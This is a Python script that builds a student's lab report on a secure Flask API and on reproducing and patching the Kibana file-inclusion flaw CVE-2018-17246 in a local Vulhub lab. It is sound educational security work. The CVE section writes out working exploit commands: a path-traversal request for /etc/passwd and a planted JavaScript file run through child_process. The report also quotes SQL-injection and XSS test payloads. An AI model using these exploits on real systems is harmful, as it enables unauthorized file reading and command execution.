#!/usr/bin/env python3
"""Generates the Work 1 report as a .docx (python-docx).

Run with the DSH bundled python (has python-docx):
  /Users/guhaotian/.dsh/dsh-runtimes/dsh-primary-runtime/dependencies/python/bin/python3 scripts/make_report.py
"""
import os
import sys

from docx import Document
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import Inches, Pt, RGBColor

REPO = "/Users/guhaotian/Desktop/work1-secure-api"
EVIDENCE = os.path.join(REPO, "evidence")
CVE_EVIDENCE = os.path.join(EVIDENCE, "cve")
OUT = "/Users/guhaotian/Desktop/Work1_Report_Guhaotian_23320209.docx"

STUDENT = "Guhaotian"
HDU_NO = "23320209"


def set_font(run, name="Calibri", size=11, bold=False, color=None, italic=False):
    run.font.name = name
    run.font.size = Pt(size)
    run.bold = bold
    run.italic = italic
    if color:
        run.font.color.rgb = RGBColor(*color)


def body(doc, text, size=11, bold=False, italic=False, align=None, space_after=6):
    p = doc.add_paragraph()
    if align == "center":
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    elif align == "right":
        p.alignment = WD_ALIGN_PARAGRAPH.RIGHT
    run = p.add_run(text)
    set_font(run, size=size, bold=bold, italic=italic)
    p.paragraph_format.space_after = Pt(space_after)
    return p


def heading(doc, text, level=1):
    h = doc.add_heading(text, level=level)
    for run in h.runs:
        run.font.color.rgb = RGBColor(0x1F, 0x3A, 0x5F)
    return h


def code(doc, text):
    p = doc.add_paragraph()
    run = p.add_run(text)
    set_font(run, name="Consolas", size=8.5)
    p.paragraph_format.space_after = Pt(4)
    pPr = p._p.get_or_add_pPr()
    shd = OxmlElement("w:shd")
    shd.set(qn("w:val"), "clear")
    shd.set(qn("w:fill"), "F2F2F2")
    pPr.append(shd)
    return p


def add_image(doc, path, width=6.2):
    if os.path.exists(path):
        doc.add_picture(path, width=Inches(width))
        doc.paragraphs[-1].alignment = WD_ALIGN_PARAGRAPH.CENTER
        return True
    body(doc, f"[screenshot: {os.path.basename(path)}]", italic=True, size=9)
    return False


def add_bullets(doc, items):
    for it in items:
        p = doc.add_paragraph(style="List Bullet")
        run = p.add_run(it)
        set_font(run, size=10.5)


def read_txt(name):
    path = os.path.join(EVIDENCE, name)
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return f.read().strip()
    return ""


def main():
    doc = Document()
    style = doc.styles["Normal"]
    style.font.name = "Calibri"
    style.font.size = Pt(11)

    # ---------------- Title page ----------------
    for _ in range(3):
        body(doc, "", size=11)
    body(doc, "HANGZHOU DIANZI UNIVERSITY", size=22, bold=True, align="center")
    body(doc, "Information Security", size=16, align="center")
    body(doc, "", size=11)
    body(doc, "Laboratory Work No. 1", size=17, bold=True, align="center")
    body(doc, "Secure REST API Development with CI/CD and", size=14, align="center")
    body(doc, "Real CVE Vulnerability Analysis", size=14, align="center")
    body(doc, "", size=11)
    body(doc, "", size=11)
    body(doc, "Variant: ______", size=13, align="center")
    body(doc, "", size=11)
    body(doc, f"Performed by: {STUDENT}", size=13, align="center")
    body(doc, f"HDU number: {HDU_NO}", size=13, align="center")
    body(doc, "", size=11)
    body(doc, "2026", size=13, align="center")
    doc.add_page_break()

    # ---------------- 1. Purpose ----------------
    heading(doc, "1. Purpose of the Work")
    body(doc,
         "The purpose of this laboratory work is to gain practical experience in the full security "
         "lifecycle of a backend application: designing protection against the OWASP Top 10, "
         "integrating security tools into a CI/CD pipeline, reproducing a known real-world CVE in a "
         "controlled environment (Vulhub), identifying its root cause, applying a fix and verifying "
         "that the attack no longer works while the main functionality still operates (regression "
         "testing).")
    body(doc,
         "The work is split into two parts: (1) a secure REST API with JWT authentication, bcrypt "
         "password hashing, SQL-injection and XSS protection, plus automated SAST/SCA scanning in "
         "GitHub Actions; and (2) the analysis of CVE-2018-17246 (Kibana Local File Inclusion), "
         "reproduced and remediated with Docker Compose.")

    # ---------------- 2. Stack & structure ----------------
    heading(doc, "2. Technology Stack and Project Structure")
    add_bullets(doc, [
        "Language / runtime: Python 3.9",
        "Web framework: Flask 3.1.3",
        "Database: SQLite via SQLAlchemy ORM (Flask-SQLAlchemy 3.1.1)",
        "Authentication: PyJWT 2.15.0 (HS256 signed tokens) + bcrypt 4.2.0 password hashing",
        "CI/CD: GitHub Actions (pytest, bandit SAST, pip-audit SCA)",
        "Vulnerable environment: Docker 29 + Docker Compose, Vulhub (kibana/CVE-2018-17246)",
    ])
    code(doc,
         "work1-secure-api/\n"
         "├── app/\n"
         "│   ├── __init__.py      # application factory + DB seed\n"
         "│   ├── config.py        # settings (SECRET_KEY, JWT, bcrypt rounds)\n"
         "│   ├── models.py        # User / Post ORM models\n"
         "│   ├── security.py      # bcrypt hashing, JWT issuing, token_required middleware\n"
         "│   ├── auth.py          # POST /auth/login\n"
         "│   └── routes.py        # GET /api/data, GET /api/users/search, POST /api/posts\n"
         "├── tests/test_api.py    # 11 pytest tests (functional + security)\n"
         "├── .github/workflows/ci.yml  # GitHub Actions pipeline\n"
         "├── scripts/             # demo.sh + evidence renderer\n"
         "├── vulhub-fix/CVE-2018-17246/  # the applied fix (compose file)\n"
         "└── README.md")

    # ---------------- 3. API description ----------------
    heading(doc, "3. API Description")
    table = doc.add_table(rows=1, cols=3)
    table.style = "Light Grid Accent 1"
    hdr = table.rows[0].cells
    for i, t in enumerate(["Endpoint", "Method", "Description"]):
        hdr[i].text = t
    rows = [
        ("/auth/login", "POST", "Authenticate (login + password); returns a signed JWT"),
        ("/api/data", "GET", "Return posts; JWT token required (401 without it)"),
        ("/api/users/search?q=", "GET", "Custom endpoint #3: user search; parameterized SQL, JWT required"),
        ("/api/posts", "POST", "Custom endpoint #3: create a post (authenticated)"),
        ("/health", "GET", "Public health check (regression testing)"),
    ]
    for r in rows:
        cells = table.add_row().cells
        for i, v in enumerate(r):
            cells[i].text = v
    body(doc, "")
    body(doc,
         "Demo accounts (seed data, bcrypt-hashed in the database): alice / Alice#Strong1, "
         "bob / Bob$Secure9, admin / Admin!23456.")

    # ---------------- 4. Security measures ----------------
    heading(doc, "4. Implemented Security Measures")
    heading(doc, "4.1 SQL injection protection (A03:2021 - Injection)", 2)
    body(doc,
         "All database access goes through SQLAlchemy ORM / Core statements with bound parameters. "
         "No SQL string is ever built by concatenation. In the search endpoint the value is passed "
         "as a bind parameter, so a payload like ' OR '1'='1 is treated as plain text:")
    code(doc,
         "stmt = select(User).where(User.username.like(bindparam(\"q\")))\n"
         "users = db.session.execute(stmt, {\"q\": f\"%{q}%\"}).scalars().all()")
    body(doc,
         "Login uses select(User).where(User.username == login) - also a bound parameter.")
    heading(doc, "4.2 XSS protection (A03:2021 - Injection)", 2)
    body(doc,
         "Every user-controlled string stored in the database is HTML-escaped with markupsafe.escape() "
         "before being returned in API responses, and Flask's jsonify additionally escapes "
         "HTML-sensitive characters in JSON. A stored payload <script>alert('xss')</script> is returned "
         "as &lt;script&gt;... and therefore cannot execute in a browser:")
    add_image(doc, os.path.join(EVIDENCE, "06_xss_readback.png"), 6.0)
    heading(doc, "4.3 Broken Authentication protection (A07:2021)", 2)
    add_bullets(doc, [
        "Passwords are hashed with bcrypt (12 rounds, random salt) - never stored in plaintext.",
        "Successful login issues a JWT (HS256) with iat/exp claims (60 minutes validity).",
        "Every /api/* endpoint is protected by the token_required middleware, which verifies the "
        "signature, checks expiry and loads the user from the token subject.",
        "Wrong password and unknown user return the same generic error (anti user enumeration).",
    ])
    code(doc,
         "HEADER : {\"alg\": \"HS256\", \"typ\": \"JWT\"}\n"
         "PAYLOAD: {\"sub\": \"2\", \"username\": \"alice\", \"role\": \"user\", \"iat\": ..., \"exp\": ...}")
    add_image(doc, os.path.join(EVIDENCE, "10_jwt_structure.png"), 5.6)

    # ---------------- 5. Testing ----------------
    heading(doc, "5. API Testing (curl)")
    body(doc,
         "The API was tested with curl (scripts/demo.sh). Successful login returns a token; access "
         "without a token is denied with 401; SQLi and XSS payloads are neutralized.")
    add_image(doc, os.path.join(EVIDENCE, "01_login_success.png"), 6.3)
    add_image(doc, os.path.join(EVIDENCE, "03_data_denied.png"), 5.4)
    add_image(doc, os.path.join(EVIDENCE, "04_data_with_token.png"), 6.3)
    add_image(doc, os.path.join(EVIDENCE, "05_sqli_attempt.png"), 6.0)
    body(doc,
         "The same behaviour is covered by an automated pytest suite (11 tests, all passed - see the "
         "CI/CD section).")

    # ---------------- 6. CI/CD ----------------
    heading(doc, "6. CI/CD Pipeline with Security Scanners")
    body(doc,
         "The pipeline (.github/workflows/ci.yml) runs on every push and pull request and consists of "
         "three jobs: functional tests (pytest), SAST (bandit) and SCA (pip-audit); scan reports are "
         "uploaded as build artifacts.")
    code(doc,
         "on: [push, pull_request]\n"
         "jobs:\n"
         "  test:  pytest -v\n"
         "  sast:  bandit -r app -f json -o bandit-report.json\n"
         "  sca:   pip-audit -r requirements.txt -f json -o pip-audit-report.json")
    heading(doc, "6.1 SAST (bandit) - result: no issues", 2)
    add_image(doc, os.path.join(EVIDENCE, "08_bandit_report.png"), 6.0)
    heading(doc, "6.2 SCA (pip-audit) - vulnerabilities found and fixed", 2)
    body(doc,
         "The first pip-audit run found 19 known vulnerabilities in 3 packages (Flask 3.0.3, "
         "PyJWT 2.9.0, python-dotenv 1.0.1). The dependencies were upgraded "
         "(Flask 3.1.3, PyJWT 2.15.0) and the unused python-dotenv package was removed; the repeated "
         "scan reports no known vulnerabilities:")
    add_image(doc, os.path.join(EVIDENCE, "09_pip_audit_report.png"), 6.0)
    add_image(doc, os.path.join(EVIDENCE, "09b_pip_audit_after_fix.png"), 4.5)
    body(doc,
         "The repository README contains the screenshots of the successful GitHub Actions run "
         "(see the 'Actions' tab after pushing the repository).", italic=True, size=9.5)

    # ---------------- 7. CVE ----------------
    heading(doc, "7. CVE-2018-17246: Environment and Reproduction")
    body(doc,
         "Selected vulnerability: CVE-2018-17246 - Kibana Local File Inclusion in the Console plugin. "
         "Kibana versions before 6.4.3 and 5.6.13 allow an unauthenticated attacker to include arbitrary "
         "files via /api/console/api_server by abusing the apis parameter. If an attacker can also upload "
         "a file to the server, the inclusion of a JavaScript file leads to remote command execution.")
    body(doc,
         "The vulnerable environment (Kibana 5.6.12 + Elasticsearch 5.6.16) was taken from Vulhub and "
         "started with Docker Compose:")
    code(doc,
         "git clone --depth 1 --filter=blob:none --sparse https://github.com/vulhub/vulhub.git\n"
         "cd vulhub && git sparse-checkout set kibana/CVE-2018-17246\n"
         "cd kibana/CVE-2018-17246 && docker compose up -d")
    add_image(doc, os.path.join(CVE_EVIDENCE, "01_compose_up.png"), 6.2)
    heading(doc, "7.1 Reproducing the file inclusion", 2)
    code(doc,
         "curl -s -o /dev/null -w \"%{http_code}\\n\" \\\n"
         "  \"http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION\\\n"
         "&apis=../../../../../../../../../../../etc/passwd\"")
    add_image(doc, os.path.join(CVE_EVIDENCE, "02_lfi_request.png"), 6.0)
    body(doc,
         "The HTTP response itself only contains a 500 error, but the Kibana log shows that "
         "/etc/passwd was successfully included:")
    add_image(doc, os.path.join(CVE_EVIDENCE, "03_lfi_logs.png"), 6.2)
    heading(doc, "7.2 Reproducing command execution", 2)
    body(doc,
         "An attacker able to upload a file (for example through a separate upload feature) can include "
         "a JavaScript file that executes a system command:")
    code(doc,
         "docker compose exec kibana bash -c 'echo \\'export default {asJson: function() "
         "{return require(\"child_process\").execSync(\"id\").toString()}}\\' > /tmp/vulhub.js'\n"
         "curl -s \"http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION\\\n"
         "&apis=../../../../../../../../../../../tmp/vulhub.js\"")
    add_image(doc, os.path.join(CVE_EVIDENCE, "04_rce_request.png"), 6.0)
    add_image(doc, os.path.join(CVE_EVIDENCE, "05_rce_result.png"), 6.0)

    # ---------------- 8. Root cause ----------------
    heading(doc, "8. Root Cause Analysis")
    body(doc,
         "The Kibana Console plugin exposes an internal endpoint /api/console/api_server that "
         "loads API documentation files. The endpoint accepts a list of file names in the apis "
         "parameter and reads them from disk with require(). In the vulnerable versions the value is "
         "not strictly validated: the special token @@SENSE_VERSION can be abused to bypass the "
         "whitelist check, and the path is then used without normalization, so ../../ sequences allow "
         "reading arbitrary files (path traversal). Because the included file is executed as "
         "JavaScript code (require), the file inclusion can be escalated to remote code execution if "
         "the attacker can place a file on the server.")
    body(doc,
         "Classification: improper input handling / missing path validation in the Console plugin "
         "(CWE-22 path traversal, CWE-98 PHP-style file inclusion analog in a Node.js application). "
         "The vulnerability is not a configuration problem of the Docker image: any deployment of "
         "Kibana 5.6.12 exposing port 5601 is affected.")

    # ---------------- 9. Fix ----------------
    heading(doc, "9. Applied Fix and Verification")
    body(doc,
         "The fix is a version upgrade of the Kibana container to the patched release 5.6.13 "
         "(Elastic fixed CVE-2018-17246 in 5.6.13 / 6.4.3 by adding strict validation of the apis "
         "parameter). The file docker-compose.yml was changed:")
    code(doc,
         "-   image: vulhub/kibana:5.6.12\n"
         "+   image: docker.elastic.co/kibana/kibana:5.6.13")
    code(doc,
         "docker compose down\n"
         "docker compose up -d   # fixed image 5.6.13")
    add_image(doc, os.path.join(CVE_EVIDENCE, "06_fix_compose.png"), 6.0)
    heading(doc, "9.1 The attack no longer works", 2)
    body(doc,
         "The same exploitation request is sent to the fixed version; the request is rejected and no "
         "file content is returned:")
    add_image(doc, os.path.join(CVE_EVIDENCE, "07_lfi_after_fix.png"), 6.0)
    heading(doc, "9.2 Regression testing", 2)
    body(doc,
         "The Kibana web interface still loads and is fully functional after the upgrade (the "
         "application starts, responds with HTTP 200 and the page is rendered):")
    add_image(doc, os.path.join(CVE_EVIDENCE, "08_regression_ui.png"), 6.2)

    # ---------------- 10. Control questions ----------------
    heading(doc, "10. Answers to Control Questions")
    qa = [
        ("1. Why is password hashing with algorithms like bcrypt preferable to using SHA-256?",
         "SHA-256 is a fast general-purpose hash: a GPU can compute billions of guesses per second, "
         "so an attacker who steals a hash database can brute-force passwords quickly. bcrypt is "
         "deliberately slow (adaptive cost factor, currently 12 rounds = ~100 ms per hash), "
         "individually salted (identical passwords produce different hashes, defeating rainbow "
         "tables) and the cost can be increased as hardware gets faster. This makes both brute-force "
         "and precomputation attacks impractical."),
        ("2. What is the main difference between SAST and DAST?",
         "SAST (Static Application Security Testing) analyzes source code without executing the "
         "application - it finds insecure patterns early, in the developer's IDE or CI, but produces "
         "false positives and cannot see runtime behaviour. DAST (Dynamic) tests the running "
         "application from the outside like an attacker (e.g. OWASP ZAP) - it finds exploitable "
         "issues at runtime, but only on reachable functionality and later in the lifecycle."),
        ("3. Describe the mechanism of a JWT. What information does it contain and how does the "
         "server verify its authenticity?",
         "A JWT consists of three base64url-encoded parts: header (algorithm, type), payload "
         "(claims: subject, username, role, issued-at, expiry) and signature. The signature is an "
         "HMAC-SHA256 over header.payload computed with the server's secret key. The server never "
         "stores sessions: it verifies the signature with its secret, checks the exp claim and "
         "trusts the claims. Because the signature cannot be forged without the secret, the server "
         "can detect any tampering."),
        ("4. What risks arise if third-party dependencies are not audited?",
         "Known vulnerabilities in libraries (e.g. Log4Shell in log4j) are inherited by the "
         "application; an attacker can exploit them even when the application's own code is "
         "secure. Without SCA (pip-audit, OWASP Dependency-Check) the team does not know that a "
         "vulnerable transitive dependency exists until it is too late."),
        ("5. What advantages does Docker + Vulhub provide for studying cybersecurity?",
         "Reproducibility and isolation: the vulnerable software runs in a container with a fixed "
         "version and configuration, isolated from the host and the real network; the environment is "
         "started and destroyed in seconds; many vulnerable applications can coexist; and it is safe "
         "to experiment because no host software is modified. It also documents the exact "
         "reproduction steps (README + compose file)."),
        ("6. What is the difference between a vulnerability and an exploit? What was reproduced?",
         "A vulnerability is a weakness in software or configuration (for example CVE-2018-17246 - "
         "missing path validation in Kibana Console). An exploit is a concrete technique or payload "
         "that takes advantage of the vulnerability (a crafted /api/console/api_server request). "
         "In this work I reproduced an exploit for an already known vulnerability (the file inclusion "
         "and the JavaScript command execution)."),
        ("7. Why is regression testing critical after a fix?",
         "A patch that blocks the attack can also break legitimate functionality (e.g. upgrading a "
         "component may change an API or configuration). If the application stops working, the fix "
         "creates a new problem and users may revert it or disable the protection. Regression tests "
         "verify that the main functionality still works after the security change - in this work the "
         "pytest suite and the manual curl checks."),
        ("8. How does knowing and reproducing CVEs help a security specialist?",
         "It develops the ability to recognize vulnerable versions and configurations, to "
         "understand exploitation mechanics and to prioritize fixes (CVSS). A pentester uses this "
         "knowledge to find and prove real risks; a SOC analyst recognizes the attack in logs and "
         "traffic; both can verify patches. Reproducing CVEs also trains methodology: identification, "
         "root-cause analysis, remediation and verification."),
    ]
    for q, a in qa:
        body(doc, q, bold=True)
        body(doc, a)

    # ---------------- 11. Conclusion ----------------
    heading(doc, "11. Conclusion")
    body(doc,
         "The work covered the full security lifecycle: a functional REST API was built with "
         "JWT authentication, bcrypt password hashing and protection against SQL injection and "
         "XSS; a CI/CD pipeline with SAST (bandit) and SCA (pip-audit) was configured and "
         "demonstrated - including a real remediation cycle of 19 vulnerable dependencies down to "
         "zero; CVE-2018-17246 was reproduced in a Vulhub Docker environment, its root cause was "
         "analyzed, and the vulnerability was eliminated by upgrading Kibana to the patched "
         "version, verified by repeating the attack and by regression testing.")
    body(doc,
         "The main lesson: security must be built into every stage of development (design, "
         "implementation, dependency management, CI/CD, and vulnerability management), and a "
         "fix is only complete when it is verified against the original attack and against "
         "regression of normal functionality.")

    # ---------------- Appendix ----------------
    doc.add_page_break()
    heading(doc, "Appendix A. Submission Checklist")
    add_bullets(doc, [
        "Repository: https://github.com/<your-username>/work1-secure-api (public)",
        "README.md in the repository root - full documentation (see repository)",
        "Last successful pipeline run: <link to the GitHub Actions run>",
        "Fix folder: vulhub-fix/CVE-2018-17246/ (fixed docker-compose.yml + FIX.md)",
    ])

    doc.save(OUT)
    print("saved:", OUT)


if __name__ == "__main__":
    main()
